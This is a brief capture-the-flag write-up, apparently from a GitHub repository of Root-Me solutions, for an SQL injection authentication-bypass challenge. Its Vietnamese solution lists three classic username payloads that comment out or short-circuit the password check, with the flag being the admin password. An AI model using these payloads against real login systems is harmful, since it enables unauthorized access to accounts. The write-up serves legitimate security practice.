# SQL injection - Authentication

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FTienNHM%2Froot-me-ctf%2Ftree%2Fmaster%2FWeb-server%2FSQL%2520Injection%2FSQL%2520injection%2520-%2520Authentication&count_bg=%2379C83D&title_bg=%232D8FFF&icon=markdown.svg&icon_color=%23092753&title=Visitors&edge_flat=false)](https://hits.seeyoufarm.com)

\*\*\* Link: http://challenge01.root-me.org/web-serveur/ch9/

## Request

![](form.PNG)

# Solution

```
    - Tấn công SQL injection với username là một trong những lệnh sau:
    + admin' --
    + *admin' */
    + admin' or '1' = '1

    Chọn password tuỳ ý.

    Cờ sẽ là password của admin.

```
